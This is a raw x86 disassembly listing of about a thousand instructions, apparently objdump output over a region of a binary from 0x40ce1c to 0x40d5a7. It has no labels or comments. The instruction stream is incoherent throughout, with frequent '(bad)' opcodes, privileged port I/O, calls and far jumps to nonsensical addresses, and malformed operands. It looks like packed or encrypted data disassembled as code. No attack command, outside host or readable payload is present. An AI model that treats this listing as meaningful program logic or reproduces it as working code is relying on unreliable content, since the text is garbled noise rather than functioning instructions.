  40ce1c:	mov    esp,0xa45424e2
  40ce21:	rol    BYTE PTR [ebx+0x67],1
  40ce24:	sbb    eax,0x37e29f26
  40ce29:	std    
  40ce2a:	std    
  40ce2b:	arpl   WORD PTR [ecx+0x2d],si
  40ce2e:	mov    ebp,0x9a678eb2
  40ce33:	shl    DWORD PTR [esi+ebp*8+0x2084c8cc],0x15
  40ce3b:	ins    BYTE PTR es:[edi],dx
  40ce3c:	outs   dx,DWORD PTR ds:[esi]
  40ce3e:	xor    eax,0xcc1a1638
  40ce43:	inc    ebx
  40ce44:	popa   
  40ce45:	stc    
  40ce46:	mov    ch,0x14
  40ce48:	shl    BYTE PTR [edi+0x28],0xf1
  40ce4c:	pop    ebp
  40ce4d:	mov    ds:0x8456f6f2,eax
  40ce52:	mov    bh,0xf3
  40ce54:	or     BYTE PTR [edx],0xae
  40ce57:	sub    DWORD PTR [esi-0x4b],ebp
  40ce5a:	mov    cs:0x984e8d51,eax
  40ce60:	aad    0xd5
  40ce62:	sub    eax,0x93b0c0fb
  40ce67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce68:	pop    ebp
  40ce69:	daa    
  40ce6a:	xchg   ebx,eax
  40ce6b:	mov    ebx,0xd514bc51
  40ce70:	rcl    ebx,1
  40ce72:	in     eax,0x62
  40ce74:	in     al,0x84
  40ce76:	or     al,0xa0
  40ce78:	ds mov esi,0x5385c49e
  40ce7e:	mov    eax,0x372cec6b
  40ce83:	(bad)  
  40ce84:	xor    dh,BYTE PTR [eax+eiz*4]
  40ce87:	test   eax,0x328c7197
  40ce8c:	push   ds
  40ce8d:	mov    al,ds:0x6a05d2b
  40ce92:	int3   
  40ce93:	pop    ebp
  40ce94:	pop    esp
  40ce95:	pop    eax
  40ce96:	mov    dl,al
  40ce98:	movhps xmm1,QWORD PTR ds:0xe1cccabc
  40ce9f:	fist   WORD PTR [eax+esi*4+0x6b]
  40cea3:	popa   
  40cea4:	test   al,0x30
  40cea6:	popf   
  40cea7:	test   dh,bh
  40cea9:	arpl   WORD PTR [ebx+0x44562953],di
  40ceaf:	call   0x31b6f8a0
  40ceb4:	cmp    DWORD PTR [esi+esi*4],esp
  40ceb7:	cmc    
  40ceb8:	jbe    0x40cea1
  40ceba:	ret    0x7d60
  40cebd:	fadd   QWORD PTR ds:0x1f449c2f
  40cec3:	add    cl,ch
  40cec5:	test   esi,esp
  40cec7:	cmc    
  40cec8:	test   BYTE PTR [esi+0x7b],al
  40cecb:	in     eax,dx
  40cecc:	outs   dx,DWORD PTR ds:[esi]
  40cecd:	mov    WORD PTR ds:0xc32c1a49,ds
  40ced3:	loopne 0x40ce95
  40ced5:	sahf   
  40ced6:	pusha  
  40ced7:	in     eax,0x67
  40ced9:	and    BYTE PTR [esi+0x90b7ca9],ah
  40cedf:	mov    esp,0x4c72cb52
  40cee4:	ja     0x40cea0
  40cee6:	lods   eax,DWORD PTR ds:[esi]
  40cee7:	in     al,0x42
  40cee9:	loopne 0x40cec3
  40ceeb:	dec    esi
  40ceec:	test   eax,0x11279790
  40cef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cef2:	mov    ds,ebx
  40cef4:	outs   dx,DWORD PTR ds:[esi]
  40cef5:	popa   
  40cef6:	das    
  40cef7:	jl     0x40cf0b
  40cef9:	lods   eax,DWORD PTR ds:[esi]
  40cefa:	sbb    DWORD PTR [ecx+0x5e53c091],0x995e45f8
  40cf04:	mov    ch,0x88
  40cf06:	scas   al,BYTE PTR es:[edi]
  40cf07:	mov    ds:0x786fc001,al
  40cf0c:	jmp    ebp
  40cf0e:	retf   
  40cf0f:	enter  0xb5fd,0xf0
  40cf13:	or     DWORD PTR [ecx-0x7b1c4323],ebp
  40cf19:	out    dx,al
  40cf1a:	pop    ebx
  40cf1b:	neg    dh
  40cf1d:	jb     0x40cf5b
  40cf1f:	xor    al,0xb4
  40cf21:	adc    BYTE PTR [edx+0x3f],cl
  40cf24:	test   esp,esi
  40cf26:	in     al,0x65
  40cf28:	cmp    BYTE PTR [ebx+edi*2],0xc5
  40cf2c:	fsubr  QWORD PTR [edx+ebx*8-0x63bc6417]
  40cf33:	xor    dh,BYTE PTR [esi+edx*1]
  40cf36:	sub    al,0x55
  40cf38:	inc    esp
  40cf39:	(bad)  
  40cf3a:	ins    BYTE PTR es:[edi],dx
  40cf3b:	test   DWORD PTR [ecx+0x406bcfd1],esi
  40cf41:	push   esi
  40cf42:	call   0xd3354fee
  40cf47:	sbb    eax,0xf999bdfb
  40cf4c:	mov    cl,0xd9
  40cf4e:	push   ebp
  40cf4f:	clc    
  40cf50:	push   cs
  40cf51:	and    al,BYTE PTR [eax]
  40cf53:	leave  
  40cf54:	cdq    
  40cf55:	enter  0x2ed6,0xb8
  40cf59:	ss inc esp
  40cf5b:	mov    ah,0x5a
  40cf5d:	jne    0x40ceea
  40cf5f:	dec    dl
  40cf61:	ja     0x40cfd3
  40cf63:	sub    BYTE PTR [ecx],bl
  40cf65:	push   eax
  40cf66:	int3   
  40cf67:	xor    eax,0x1be5d572
  40cf6c:	mov    ds:0x5878969,al
  40cf71:	js     0x40cf2d
  40cf73:	in     eax,dx
  40cf74:	or     DWORD PTR ds:0x8f3ec237,ecx
  40cf7a:	pushf  
  40cf7b:	mov    dh,0x40
  40cf7d:	adc    bl,BYTE PTR [ebx-0x1c148694]
  40cf83:	int3   
  40cf84:	push   0x10124bfb
  40cf89:	cmp    dh,dh
  40cf8b:	inc    edx
  40cf8c:	xchg   ebx,eax
  40cf8d:	xchg   edi,eax
  40cf8e:	jo     0x40cffd
  40cf90:	into   
  40cf91:	call   0x770636dc
  40cf96:	ds mov cl,0x31
  40cf99:	and    al,0x35
  40cf9b:	cdq    
  40cf9c:	sub    DWORD PTR [ebp-0x66081c58],ebx
  40cfa2:	sbb    dh,BYTE PTR [esi+0x67]
  40cfa5:	mov    esi,0x4174c3a4
  40cfaa:	adc    edx,DWORD PTR [ebx-0x26]
  40cfad:	jmp    0x4087f603
  40cfb2:	addr16 jle 0x40cfcc
  40cfb5:	ror    ecx,0x15
  40cfb8:	inc    ebx
  40cfb9:	rcr    DWORD PTR [edi-0x5fba71b1],cl
  40cfbf:	rcl    DWORD PTR [esi-0x62013989],0xed
  40cfc6:	push   es
  40cfc7:	mov    ds:0x52bf100c,eax
  40cfcc:	push   edx
  40cfcd:	cwde   
  40cfce:	sub    BYTE PTR [edx],dl
  40cfd0:	push   es
  40cfd1:	or     cl,dl
  40cfd3:	mov    DWORD PTR ds:0x9d484503,0x981ba372
  40cfdd:	mov    edx,0x5e29946b
  40cfe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfe3:	ds in  eax,dx
  40cfe5:	retf   
  40cfe6:	pusha  
  40cfe7:	inc    esi
  40cfe8:	shl    ch,1
  40cfea:	sub    eax,ebp
  40cfec:	and    bl,BYTE PTR [eax+0x6a6322db]
  40cff2:	xor    BYTE PTR [ebx],0x96
  40cff5:	xchg   edx,eax
  40cff6:	mov    cs,eax
  40cff8:	pop    ebp
  40cff9:	(bad)  [ecx+0x18]
  40cffc:	iret   
  40cffd:	sub    ah,BYTE PTR [eax+0x64]
  40d000:	mov    dh,0xcd
  40d002:	iret   
  40d003:	ret    0x99a4
  40d006:	pop    esi
  40d007:	or     al,0x86
  40d009:	jge    0x40cff7
  40d00b:	in     eax,dx
  40d00c:	cli    
  40d00d:	dec    edx
  40d00e:	cmp    al,0xab
  40d010:	clc    
  40d011:	cmp    edi,DWORD PTR [esi]
  40d013:	(bad)  
  40d014:	xchg   ecx,eax
  40d015:	outs   dx,DWORD PTR ds:[esi]
  40d016:	and    ch,al
  40d018:	sub    bl,BYTE PTR [eax+0xdc9da90]
  40d01e:	clc    
  40d01f:	stc    
  40d020:	and    DWORD PTR [esi+0x1efede7d],edx
  40d026:	iret   
  40d027:	pop    eax
  40d028:	adc    BYTE PTR [eax-0x71036588],bl
  40d02e:	jp     0x40d01a
  40d030:	repnz pop edx
  40d032:	fnstenv [esi]
  40d034:	mov    edi,DWORD PTR [esi+0x1899f499]
  40d03a:	(bad)
  40d03e:	iret   
  40d03f:	or     BYTE PTR [edi*8-0x1a36949a],ah
  40d046:	xchg   ecx,eax
  40d047:	rcr    DWORD PTR ds:0x517a797c,0x4f
  40d04e:	mov    ds:0x582fecf6,al
  40d053:	mov    ah,0x82
  40d055:	les    esi,FWORD PTR [ebx+0x5dac05c6]
  40d05b:	scas   eax,DWORD PTR es:[edi]
  40d05c:	ins    DWORD PTR es:[edi],dx
  40d05d:	(bad)
  40d060:	xor    eax,0x221c9869
  40d065:	mov    edi,0x8012dacf
  40d06a:	pushf  
  40d06b:	mov    ch,0xb0
  40d06d:	mov    ebp,0x674c18e6
  40d072:	or     cl,BYTE PTR [ebp+ebx*8-0x3c8050f3]
  40d079:	push   esi
  40d07a:	xchg   ebp,eax
  40d07b:	popf   
  40d07c:	xor    bh,BYTE PTR [esi-0x21]
  40d07f:	fs sub al,0x5a
  40d082:	sub    BYTE PTR [eax-0x573c9c57],bl
  40d088:	je     0x40d0f2
  40d08a:	(bad)  
  40d08b:	int3   
  40d08c:	js     0x40d092
  40d08e:	xlat   BYTE PTR ds:[ebx]
  40d08f:	cmp    ah,dl
  40d091:	je     0x40d03a
  40d093:	sub    al,0x29
  40d095:	or     edi,DWORD PTR [esi+eax*4]
  40d098:	inc    ecx
  40d099:	push   esp
  40d09a:	or     ch,BYTE PTR [ebp+0x2bae2207]
  40d0a0:	xchg   ecx,eax
  40d0a1:	dec    esi
  40d0a2:	mov    bh,BYTE PTR [eax-0xf]
  40d0a5:	sar    BYTE PTR [ebx-0x4f99202],0x92
  40d0ac:	pop    edi
  40d0ad:	or     eax,ebx
  40d0af:	mov    edi,0x9a9fdac6
  40d0b4:	jle    0x40d105
  40d0b6:	adc    al,bh
  40d0b8:	out    0xfd,al
  40d0ba:	js     0x40d0d8
  40d0bc:	add    DWORD PTR [eax-0x2c],0xffffff89
  40d0c0:	push   ss
  40d0c1:	hlt    
  40d0c2:	int3   
  40d0c3:	and    DWORD PTR [eax-0x11],edx
  40d0c6:	lods   al,BYTE PTR ds:[esi]
  40d0c7:	std    
  40d0c8:	loopne 0x40d0e1
  40d0ca:	sub    ah,BYTE PTR [esp+esi*2]
  40d0cd:	xchg   esp,eax
  40d0ce:	inc    ebx
  40d0cf:	xchg   ebp,eax
  40d0d0:	mov    WORD PTR [eax-0x17cfb5c2],es
  40d0d6:	cmp    BYTE PTR [edi],0xbd
  40d0d9:	mov    ah,0xdb
  40d0db:	mov    ?,edi
  40d0dd:	and    al,BYTE PTR [ecx+0x2c3a72ca]
  40d0e3:	xchg   BYTE PTR [edi+esi*2+0x7ac4b1c7],al
  40d0ea:	iret   
  40d0eb:	mov    al,ds:0x49a7b401
  40d0f0:	jp     0x40d108
  40d0f2:	in     al,dx
  40d0f3:	push   ss
  40d0f4:	lds    esi,FWORD PTR [ebx]
  40d0f6:	sbb    esi,DWORD PTR [esi+0x8]
  40d0f9:	and    esp,esi
  40d0fb:	retf   0xb3be
  40d0fe:	add    DWORD PTR [ecx+0x2c],0x69
  40d102:	ds mov edi,0x245e0d01
  40d108:	(bad)  
  40d109:	ja     0x40d0e8
  40d10b:	addr16 retf 0x5608
  40d10f:	cmp    DWORD PTR [edi-0x4e],esi
  40d112:	add    BYTE PTR [eax],bl
  40d114:	mov    edx,0xf9f08f6d
  40d119:	xchg   ecx,eax
  40d11a:	mov    dh,0xa1
  40d11c:	jns    0x40d0e6
  40d11e:	cld    
  40d11f:	test   DWORD PTR [ebp-0x7f],0x3b3a41d3
  40d126:	add    bh,BYTE PTR [edi-0x2d750a3e]
  40d12c:	outs   dx,BYTE PTR ds:[esi]
  40d12d:	fldcw  WORD PTR [ecx+0x21592d51]
  40d133:	and    DWORD PTR [edi+0x6a51974d],0x4e0da21f
  40d13d:	pop    ss
  40d13e:	enter  0x9270,0x47
  40d142:	rcr    ecx,0xc1
  40d145:	test   al,0x8
  40d147:	fs mov dl,0x33
  40d14a:	hlt    
  40d14b:	dec    edi
  40d14c:	scas   eax,DWORD PTR es:[edi]
  40d14d:	test   eax,0x2e409dd2
  40d152:	mov    WORD PTR [eax-0x23],fs
  40d155:	mov    esi,0x55dcd26a
  40d15a:	push   eax
  40d15b:	add    bl,BYTE PTR [esp+edi*4+0x31]
  40d15f:	and    BYTE PTR [edx],bl
  40d161:	lahf   
  40d162:	add    edx,esp
  40d164:	inc    eax
  40d165:	mov    BYTE PTR [eax+0x518b174],bh
  40d16b:	aas    
  40d16c:	retf   0x1252
  40d16f:	inc    ebx
  40d170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d171:	cmp    DWORD PTR [ebp-0xf],esi
  40d174:	adc    edx,ebp
  40d176:	adc    al,0xf5
  40d178:	or     eax,0xbd2a3ff4
  40d17d:	xor    eax,0x29fc2ef2
  40d182:	div    DWORD PTR [edx+0x168e6073]
  40d188:	ins    BYTE PTR es:[edi],dx
  40d189:	mov    ah,0x92
  40d18b:	push   eax
  40d18c:	sub    cl,0xd1
  40d18f:	icebp  
  40d190:	jl     0x40d1fc
  40d192:	dec    eax
  40d193:	or     al,0x9f
  40d195:	xchg   esi,eax
  40d196:	lea    ebx,[eax+0x2d]
  40d199:	in     eax,dx
  40d19a:	pop    ss
  40d19b:	test   DWORD PTR [edx-0x18fc7a96],eax
  40d1a1:	pop    ds
  40d1a2:	das    
  40d1a3:	mov    bh,0xd2
  40d1a5:	jmp    0xe93d7206
  40d1aa:	je     0x40d1be
  40d1ac:	inc    eax
  40d1ad:	jp     0x40d1d7
  40d1af:	test   BYTE PTR [edi-0x32],cl
  40d1b2:	nop
  40d1b3:	ror    DWORD PTR [ecx-0x3a],1
  40d1b6:	div    BYTE PTR [esi-0x7e]
  40d1b9:	xor    al,0x1f
  40d1bb:	add    al,BYTE PTR [eax-0x633b47e4]
  40d1c1:	outs   dx,DWORD PTR ds:[esi]
  40d1c2:	call   0xdb7d788c
  40d1c7:	mov    ebx,DWORD PTR [edx]
  40d1c9:	cmp    BYTE PTR [ebx-0x2c9598b0],bl
  40d1cf:	jbe    0x40d206
  40d1d1:	cmp    al,BYTE PTR [ebx+0x73]
  40d1d4:	fild   DWORD PTR [eax]
  40d1d6:	fnstsw WORD PTR [ebx+0x6e8b8d4f]
  40d1dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1dd:	sub    DWORD PTR [edx+ebx*2+0x34],ebx
  40d1e1:	adc    BYTE PTR [ebx+0xebbf21e],0x1f
  40d1e8:	call   0x1140c64b
  40d1ed:	(bad)  
  40d1ee:	or     esi,ecx
  40d1f0:	fdiv   st,st(3)
  40d1f2:	in     eax,0xdb
  40d1f4:	mov    esp,0x5838570d
  40d1f9:	jo     0x40d1ef
  40d1fb:	add    eax,0x675bc7a0
  40d200:	adc    al,0xdb
  40d202:	mov    bl,0xa7
  40d204:	outs   dx,BYTE PTR ds:[esi]
  40d205:	cdq    
  40d206:	ins    BYTE PTR es:[edi],dx
  40d207:	stc    
  40d208:	push   eax
  40d209:	mov    esi,0x5c2823d1
  40d20e:	aaa    
  40d20f:	shl    DWORD PTR [esi-0x2e],1
  40d212:	scas   eax,DWORD PTR es:[edi]
  40d213:	mov    bh,0x35
  40d215:	(bad)  
  40d216:	ret    
  40d217:	push   esp
  40d218:	xchg   ebp,eax
  40d219:	xchg   esi,eax
  40d21a:	pop    ds
  40d21b:	pushf  
  40d21c:	pop    esp
  40d21d:	leave  
  40d21e:	adc    ebx,eax
  40d220:	sub    bl,0xeb
  40d223:	mov    al,ds:0x38e62b05
  40d228:	fs sbb al,0xf1
  40d22b:	jo     0x40d1fa
  40d22d:	clc    
  40d22e:	ja     0x40d226
  40d230:	int    0x1f
  40d232:	jmp    0xf362:0xcfc56fd1
  40d239:	push   ebp
  40d23a:	repnz or al,0xc2
  40d23d:	out    dx,al
  40d23e:	jae    0x40d20f
  40d240:	xchg   ecx,eax
  40d241:	jecxz  0x40d2bb
  40d243:	in     al,0x70
  40d245:	lahf   
  40d246:	or     eax,0xd0a84ce4
  40d24b:	mov    al,0x59
  40d24d:	mov    eax,ds:0xd0b181c7
  40d252:	imul   esi,DWORD PTR [esi-0x22],0x1ddfe8f8
  40d259:	gs sub eax,0x22997660
  40d25f:	jl     0x40d294
  40d261:	pusha  
  40d262:	pop    esi
  40d263:	mov    ebx,0xe306f95f
  40d268:	jns    0x40d28a
  40d26a:	rcr    DWORD PTR [ecx-0x2472f63a],1
  40d270:	out    dx,eax
  40d271:	sbb    DWORD PTR [edi+0x1a5ad8d],ebp
  40d277:	jne    0x40d222
  40d279:	mov    DWORD PTR [esi-0x8424c9d],0x192ffa08
  40d283:	push   dx
  40d285:	push   ss
  40d286:	push   cs
  40d287:	jnp    0x40d2f5
  40d289:	pop    es
  40d28a:	sub    al,0x7a
  40d28c:	add    BYTE PTR [ebx-0x2e0f5706],bl
  40d292:	sub    BYTE PTR [ebx+ecx*2+0x7e],bh
  40d296:	popa   
  40d297:	sbb    al,0x50
  40d299:	push   esp
  40d29a:	mov    edx,0x3bb7a497
  40d29f:	ins    BYTE PTR es:[edi],dx
  40d2a0:	scas   eax,DWORD PTR es:[edi]
  40d2a1:	push   ss
  40d2a2:	and    DWORD PTR [edx+0x55177aec],ecx
  40d2a8:	fcmovb st,st(1)
  40d2aa:	inc    eax
  40d2ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ac:	mov    ah,0x69
  40d2ae:	stos   DWORD PTR es:[edi],eax
  40d2af:	push   ecx
  40d2b0:	cmc    
  40d2b1:	fisttp DWORD PTR [esi-0x1d]
  40d2b4:	pop    esp
  40d2b5:	push   edi
  40d2b6:	test   BYTE PTR ds:0x619c4e04,bh
  40d2bc:	xchg   edx,eax
  40d2bd:	pusha  
  40d2be:	out    0xe4,eax
  40d2c0:	imul   edi,DWORD PTR [esi],0xffffff8b
  40d2c3:	cmp    dl,ah
  40d2c5:	jo     0x40d2e7
  40d2c7:	stos   DWORD PTR es:[edi],eax
  40d2c8:	pop    ebp
  40d2c9:	jne    0x40d344
  40d2cb:	inc    ecx
  40d2cc:	rcr    BYTE PTR [ebp+0x14],0x71
  40d2d0:	addr16 jp 0x40d28d
  40d2d3:	lea    ebx,[ecx-0x6f]
  40d2d6:	xchg   DWORD PTR [ebp+edx*1+0x53],eax
  40d2da:	(bad)  
  40d2db:	xchg   ecx,eax
  40d2dc:	mov    cl,0x66
  40d2de:	in     eax,0xd7
  40d2e0:	sbb    ecx,DWORD PTR [ebx]
  40d2e2:	retf   
  40d2e3:	pop    esp
  40d2e4:	xlat   BYTE PTR ds:[ebx]
  40d2e5:	sbb    BYTE PTR [ebp+0x7b],ah
  40d2e8:	pop    ebx
  40d2e9:	je     0x40d355
  40d2eb:	push   edx
  40d2ec:	pop    ecx
  40d2ed:	dec    edi
  40d2ee:	and    ebp,esi
  40d2f0:	pop    edx
  40d2f1:	jmp    0x6eca:0x5442d0f9
  40d2f8:	mov    bh,0x50
  40d2fa:	sub    eax,0xb4a6dc2c
  40d2ff:	mov    edx,0x77d8f394
  40d304:	push   esp
  40d305:	ret    0x9b02
  40d308:	pop    eax
  40d309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d30a:	addr16 add ch,al
  40d30d:	in     al,dx
  40d30e:	inc    ebx
  40d30f:	mov    ebp,0x9d873864
  40d314:	cs stos DWORD PTR es:[edi],eax
  40d316:	xor    DWORD PTR [edx+0x7c366291],ebx
  40d31c:	sbb    BYTE PTR [edx+0x3b],dl
  40d31f:	xor    al,0xae
  40d321:	pop    esi
  40d322:	dec    esi
  40d323:	pop    ebx
  40d324:	push   esp
  40d325:	mov    esi,0xdbf6973a
  40d32a:	dec    eax
  40d32b:	lahf   
  40d32c:	imul   BYTE PTR [eax]
  40d32e:	push   edi
  40d32f:	ficom  WORD PTR ds:0x9c3c72f0
  40d335:	in     al,0xc0
  40d337:	jle    0x40d389
  40d339:	mov    bh,0x74
  40d33b:	cmc    
  40d33c:	fmul   DWORD PTR [ebx+0x3c]
  40d33f:	jnp    0x40d2c9
  40d341:	mov    al,0x15
  40d343:	mov    ecx,0x766b9aa6
  40d348:	into   
  40d349:	pop    ebx
  40d34a:	jne    0x40d2e7
  40d34c:	fcom   st(5)
  40d34e:	adc    al,0x50
  40d350:	cmp    eax,0x7410502a
  40d355:	fsubr  st,st(4)
  40d357:	sub    BYTE PTR [eax*4-0x54b8abc8],bl
  40d35e:	sub    al,0x4d
  40d360:	mov    al,ds:0x6c1a5848
  40d365:	es pop ecx
  40d367:	xchg   ebp,eax
  40d368:	jecxz  0x40d33f
  40d36a:	iret   
  40d36b:	inc    esi
  40d36c:	dec    edi
  40d36d:	and    bh,ah
  40d36f:	xor    eax,0x19dfef75
  40d374:	mov    edi,DWORD PTR [edx+0x3b]
  40d377:	dec    eax
  40d378:	inc    edi
  40d379:	les    ecx,FWORD PTR [edx]
  40d37b:	xchg   esp,eax
  40d37c:	xchg   ebx,eax
  40d37d:	leave  
  40d37e:	in     eax,0x39
  40d380:	pop    edx
  40d381:	and    ecx,esi
  40d383:	imul   esi,ecx,0x35
  40d386:	out    dx,al
  40d387:	adc    eax,0x7ab854db
  40d38c:	stos   DWORD PTR es:[edi],eax
  40d38d:	or     al,0x83
  40d38f:	sub    dh,0x8a
  40d392:	add    DWORD PTR [eax],esp
  40d394:	or     ebx,DWORD PTR [esi+0x18]
  40d397:	cdq    
  40d398:	dec    esp
  40d399:	mov    DWORD PTR [edi+0x79b97621],0xb4d501b8
  40d3a3:	shr    BYTE PTR [ebx+0x7d],cl
  40d3a6:	xor    ecx,DWORD PTR [esi+eiz*8+0x39]
  40d3aa:	(bad)  
  40d3ab:	loopne 0x40d3e6
  40d3ad:	sub    edx,eax
  40d3af:	push   ds
  40d3b0:	sub    DWORD PTR [edx-0x33cb9d62],edx
  40d3b6:	jae    0x40d361
  40d3b8:	sbb    DWORD PTR es:[ebx-0x56],0xf7740948
  40d3c0:	cwde   
  40d3c1:	in     eax,0x3d
  40d3c3:	shl    edi,cl
  40d3c5:	adc    al,BYTE PTR [edi-0x715bd0c1]
  40d3cb:	ret    
  40d3cc:	daa    
  40d3cd:	xor    eax,DWORD PTR [ecx+0x31]
  40d3d0:	xor    ebp,DWORD PTR [eax+0x41]
  40d3d3:	xor    eax,0x7e8ba9c9
  40d3d8:	adc    esp,DWORD PTR [esi+edx*4-0x63]
  40d3dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3dd:	and    eax,0xc26897a6
  40d3e2:	or     ch,BYTE PTR [esi]
  40d3e4:	cmp    BYTE PTR [edi-0xc],bl
  40d3e7:	int3   
  40d3e8:	nop
  40d3e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3ea:	cld    
  40d3eb:	repz adc DWORD PTR [edx+0x33],eax
  40d3ef:	or     BYTE PTR [ebx+ebx*8-0x286ed931],0xed
  40d3f7:	jmp    0xe1daa4
  40d3fc:	dec    esi
  40d3fd:	jmp    0x86ae8e65
  40d402:	mov    bh,BYTE PTR [eax]
  40d404:	pop    eax
  40d405:	clc    
  40d406:	leave  
  40d407:	pop    es
  40d408:	test   BYTE PTR [edi+0x16],bl
  40d40b:	jmp    0x40d3fc
  40d40d:	jl     0x40d47b
  40d40f:	sbb    al,BYTE PTR [ebx]
  40d411:	cld    
  40d412:	add    al,0xe8
  40d414:	mov    ecx,0xc67e6bd9
  40d419:	retf   0xcbc8
  40d41c:	inc    edi
  40d41d:	ror    BYTE PTR [edx+0x558178dc],cl
  40d423:	stc    
  40d424:	or     BYTE PTR [esp+eiz*8-0x2b014e07],al
  40d42b:	xchg   edx,eax
  40d42c:	(bad)  
  40d42d:	or     DWORD PTR [ebx-0x1f],edx
  40d430:	xchg   esp,eax
  40d431:	rcr    BYTE PTR [eax-0x1c],0x7c
  40d435:	dec    esp
  40d436:	imul   ecx,DWORD PTR ds:0x191c2a07,0x44839d25
  40d440:	outs   dx,BYTE PTR fs:[esi]
  40d442:	sbb    esi,DWORD PTR [eax+ebp*2-0x52cbcb75]
  40d449:	sbb    BYTE PTR [edi-0x2cf210ea],dl
  40d44f:	sub    al,0x12
  40d451:	mov    WORD PTR [ebp+0x3c],ss
  40d454:	push   esi
  40d455:	leave  
  40d456:	adc    ecx,DWORD PTR [edi]
  40d458:	enter  0x8472,0xd9
  40d45c:	(bad)  
  40d45d:	aad    0xc6
  40d45f:	jmp    0x40d3eb
  40d461:	mov    al,ch
  40d463:	scas   al,BYTE PTR es:[edi]
  40d464:	jns    0x40d476
  40d466:	pop    edi
  40d467:	push   eax
  40d468:	inc    esi
  40d469:	sbb    DWORD PTR [ebp+0x19cf3d21],edx
  40d46f:	stc    
  40d470:	in     eax,0xaf
  40d472:	sbb    eax,0x9788bea4
  40d477:	jns    0x40d47a
  40d479:	je     0x40d4c8
  40d47b:	lea    esp,[esi+0xe]
  40d47e:	fmul   DWORD PTR [ecx]
  40d480:	mov    ah,al
  40d482:	and    edx,eax
  40d484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d485:	mov    edx,0x631e75bb
  40d48a:	jecxz  0x40d4e9
  40d48c:	or     eax,DWORD PTR [edi-0x2b]
  40d48f:	test   BYTE PTR [esi+0x6],bh
  40d492:	sub    al,bl
  40d494:	sbb    DWORD PTR [edi+0x1f],ebp
  40d497:	or     al,0xcb
  40d499:	jbe    0x40d4ee
  40d49b:	push   es
  40d49c:	in     al,0x2c
  40d49e:	out    0xba,al
  40d4a0:	loope  0x40d456
  40d4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4a3:	cmp    al,0x1a
  40d4a6:	ds jp  0x40d46a
  40d4a9:	arpl   WORD PTR [ecx+0x339e1e5b],bx
  40d4af:	mov    bl,0x8d
  40d4b1:	std    
  40d4b2:	sbb    DWORD PTR [ebp-0x80],0x12378d73
  40d4b9:	push   0x8a0049bb
  40d4be:	in     eax,0x62
  40d4c0:	push   0x27
  40d4c2:	imul   ebp,DWORD PTR [ebp*8+0x4dd94122],0x9da1a437
  40d4cd:	das    
  40d4ce:	inc    eax
  40d4cf:	shl    DWORD PTR [ecx-0x69],1
  40d4d2:	sbb    DWORD PTR [edi+0x74],ecx
  40d4d5:	jno    0x40d4f7
  40d4d7:	and    BYTE PTR [ebp+0x14],bh
  40d4da:	addr16 mov al,ds:0x760d
  40d4de:	jmp    0x40d471
  40d4e0:	ret    
  40d4e1:	dec    eax
  40d4e2:	sbb    DWORD PTR [edi-0xa],ebx
  40d4e5:	scas   al,BYTE PTR es:[edi]
  40d4e6:	xchg   edx,eax
  40d4e7:	inc    DWORD PTR [edx-0x28]
  40d4ea:	dec    esi
  40d4eb:	sub    al,0x72
  40d4ed:	pop    ds
  40d4ee:	sti    
  40d4ef:	(bad)  
  40d4f0:	retf   
  40d4f1:	sbb    cl,BYTE PTR [eax]
  40d4f3:	pop    esp
  40d4f4:	mov    ebp,0xe53cd863
  40d4f9:	icebp  
  40d4fa:	mov    esi,0xe9dadf6b
  40d4ff:	and    dh,BYTE PTR [edi+0x6]
  40d502:	cmp    dl,BYTE PTR cs:[edx+0x76e3cd40]
  40d509:	push   es
  40d50a:	sub    bl,cl
  40d50c:	cdq    
  40d50d:	push   edx
  40d50e:	mov    WORD PTR [ebp+0x5a0db8bb],?
  40d514:	xor    al,ah
  40d516:	push   ss
  40d517:	shr    BYTE PTR [esi],cl
  40d519:	mov    ds:0x5cd49b49,eax
  40d51e:	mov    esp,0x1e2edead
  40d523:	ror    DWORD PTR [edi+0x64],0x3e
  40d527:	fisttp DWORD PTR [eax+0x40bc482a]
  40d52d:	mov    ch,0xc7
  40d52f:	(bad)  
  40d530:	fisub  DWORD PTR [edi+edx*2+0x78c75066]
  40d537:	out    dx,eax
  40d538:	outs   dx,BYTE PTR ds:[esi]
  40d539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d53a:	or     BYTE PTR [edi+0x1d02300c],al
  40d540:	(bad)  
  40d541:	bound  edx,QWORD PTR [ebx-0x56]
  40d544:	(bad)  
  40d545:	mov    ds:0x4ed50e98,eax
  40d54a:	fs xchg ebp,eax
  40d54c:	bound  esp,QWORD PTR [ebx+0x4a82b160]
  40d552:	xor    bl,ch
  40d554:	sub    eax,0xa4a14cd4
  40d559:	sub    cl,BYTE PTR [esi]
  40d55b:	outs   dx,BYTE PTR ds:[esi]
  40d55c:	push   ss
  40d55d:	lds    edi,FWORD PTR [ecx+0x7d7e113a]
  40d563:	sbb    ebp,DWORD PTR [ecx-0x207c32b6]
  40d569:	pop    ds
  40d56a:	out    dx,eax
  40d56b:	jecxz  0x40d530
  40d56d:	jns    0x40d54a
  40d56f:	je     0x40d4f1
  40d571:	cs and al,0x2d
  40d574:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d575:	mov    al,0xcd
  40d577:	in     al,0x9d
  40d579:	inc    eax
  40d57a:	shl    BYTE PTR [esi+edi*4+0x57a21fb],0x66
  40d582:	iret   
  40d583:	xlat   BYTE PTR ds:[ebx]
  40d584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d585:	sub    ebp,DWORD PTR ds:0x34f32392
  40d58b:	dec    ebp
  40d58c:	fiadd  DWORD PTR ds:0x58b50cd
  40d592:	imul   edx,DWORD PTR [ebp-0x46f2a93f],0x72
  40d599:	adc    al,0x7a
  40d59b:	imul   edi,DWORD PTR [esi+0x276ed53d],0x9d56fa3
  40d5a5:	xor    bl,al
  40d5a7:	and    DWORD PTR [edi-0x71],ebx
